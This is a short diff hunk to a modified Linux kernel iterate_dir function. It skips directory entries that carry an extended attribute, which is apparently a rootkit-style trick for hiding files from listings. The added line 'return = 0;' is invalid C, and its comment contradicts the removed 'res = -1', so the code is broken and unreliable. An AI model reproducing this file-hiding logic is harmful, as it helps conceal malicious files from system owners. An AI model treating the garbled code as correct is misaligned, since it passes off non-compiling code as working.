@@ -80,7 +80,7 @@ int iterate_dir(struct file *file, struct dir_context *ctx)
 				// xattr exists, skip listing this directory entry
 				//Check for differnt types depending on type
 				printk("hit");
-				res = -1; // Set result to 0 to indicate success (no error)
+				return = 0; // Set result to 0 to indicate success (no error)
 			}
 		}
 	}
